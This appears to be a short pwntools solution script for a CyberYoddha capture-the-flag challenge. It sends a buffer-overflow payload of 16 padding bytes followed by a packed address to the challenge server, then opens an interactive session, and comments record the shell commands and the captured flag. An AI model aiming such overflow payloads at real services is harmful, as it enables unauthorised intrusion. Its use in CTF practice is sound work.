from pwn import *
conn = remote("cyberyoddha.baycyber.net",10003)
conn.sendline("a"*(16)+p64( 0xD3ADB33F))
conn.interactive()
# ls
#cat flag.txt
#CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}